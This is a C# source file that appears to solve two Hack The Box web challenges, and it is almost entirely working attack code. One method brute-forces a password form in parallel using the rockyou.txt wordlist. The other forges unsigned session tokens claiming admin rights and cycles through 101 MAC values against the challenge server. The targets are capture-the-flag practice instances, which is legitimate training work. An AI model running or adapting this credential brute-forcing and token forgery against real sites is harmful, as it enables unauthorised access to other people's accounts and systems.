using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IdentityModel.Tokens.Jwt;
using System.Net.Http;
using System.Security.Claims;
using System.Text;
using System.Threading.Tasks;

namespace JAMTech
{
    public class HackTheBox
    {
        public static void Solved2()
        {
            var unexpectedBody = System.IO.File.ReadAllText(@"C:\Users\a159609\response2.txt");
            var originalJwt = "eyJVc2VyIjoiZWZiZmFjZmVmYWJmZGVlc3NzIiwiQWRtaW4iOiJGYWxzZSIsIk1BQyI6IjA0OGEyOGU4MGNiOTczNjZlODI0MTNkMTU0MWVkYTBkIn0";
            var cookie = "ses=";
            var siteUrl = "http://docker.hackthebox.eu:32928/index.php";
                       

            var testArgs = new[] { Environment.ProcessorCount * 2 }; //, (Environment.ProcessorCount - 1) * 2, (Environment.ProcessorCount * 2) -1 , Environment.ProcessorCount * 2};
            foreach (var arg in testArgs)
            {
                var paralellism = arg;
                var timer = Stopwatch.StartNew();
                Parallel.For(0, 101, new ParallelOptions { MaxDegreeOfParallelism = paralellism }, i =>
                {
                    var dic = new Dictionary<string, string>();
                    dic.Add("User", "Admin");
                    dic.Add("Admin", "True");
                    dic.Add("MAC", i.ToString());
                    var jwt = CreateAuthToken(dic);
                    var jsonJwt = jwt.EncodedPayload;
                    if (originalJwt == jsonJwt)
                        throw new ApplicationException("JWT replicado");

                    using (var client = new HttpClient())
                    {
                        client.DefaultRequestHeaders.Add("Cookie", "ses=" + jsonJwt);
                        var response = client.PostAsync(siteUrl, null).Result;
                        var responseBody = response.Content.ReadAsStringAsync().Result;
                        if (responseBody != unexpectedBody)
                        {
                            Console.WriteLine(responseBody);
                        }
                    }
                });
                timer.Stop();
                Console.WriteLine($"100 requests in {timer.ElapsedMilliseconds} ms with {paralellism} of paralellism");
            }

                    
            return;
        }

        public static JwtSecurityToken CreateAuthToken(Dictionary<string, string> customClaims = null)
        {
            var claims = new List<Claim>();
            if (customClaims != null)
            {
                foreach (var claim in customClaims)
                {
                    if(claim.Key== "MAC" || claim.Key == "Admin")
                    {
                        claims.Add(new Claim(claim.Key, claim.Value, ClaimValueTypes.Integer));
                    }
                    else
                        claims.Add(new Claim(claim.Key, claim.Value));
                }
            }
            var payload = new JwtPayload();
            payload.AddClaims(claims);
            return new JwtSecurityToken(new JwtHeader(), payload);
        }



        public static void Solved1()
        {
            //hacking
            var count = 0;
            var errCount = 0;
            var siteUrl = "http://docker.hackthebox.eu:32817";
            var responseBodyWrong = System.IO.File.ReadAllText(@"C:\Users\a159609\response.txt");
            var passwords = System.IO.File.ReadAllLines(@"C:\Users\a159609\rockyou.txt");

            //brute way!! :D
            var testArgs = new[] { Environment.ProcessorCount }; //, (Environment.ProcessorCount - 1) * 2, (Environment.ProcessorCount * 2) -1 , Environment.ProcessorCount * 2};
            foreach (var arg in testArgs)
            {
                var paralellism = arg;
                var timer = Stopwatch.StartNew();
                Parallel.ForEach(passwords, new ParallelOptions { MaxDegreeOfParallelism = paralellism }, password =>
                {
                    var result = CheckPassword(password, siteUrl, responseBodyWrong, true).Result;
                    if (result.Key)
                    {
                        throw new ApplicationException("Password found: " + result.Value);
                    }
                });
                timer.Stop();
                Console.WriteLine($"{passwords.Length} check in {timer.ElapsedMilliseconds} ms with {paralellism} of paralellism");
            }
            //nice way
            //var tasks = passwords.Select(password => Task.Run<KeyValuePair<bool, string>>(async () =>
            //{
            //    return await CheckPassword(password, siteUrl, responseBodyWrong);
            //}));

            //Task.WhenAll(tasks.ToArray());
            //var validResults = tasks.Select(r => r.Result.Key).ToList();
            return;
        }

        private static async Task<KeyValuePair<bool, string>> CheckPassword(string password, string siteUrl, string responseBodyWrong, bool verbose = false)
        {
            var pars = new List<KeyValuePair<string, string>>()
                {
                    new KeyValuePair<string, string>("password", password)
                };
            var content = new FormUrlEncodedContent(pars);
            using (var client = new HttpClient())
            {
                var response = await client.PostAsync(siteUrl, content);
                var responseBody = await response.Content.ReadAsStringAsync();
                var result = responseBody != responseBodyWrong;
                //To know the progress
                if (verbose)
                {
                    if (result)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("Password found: " + password);
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Wrong password: " + password);
                    }
                }
                return new KeyValuePair<bool, string>(result, password);
            }
        }

    }
}
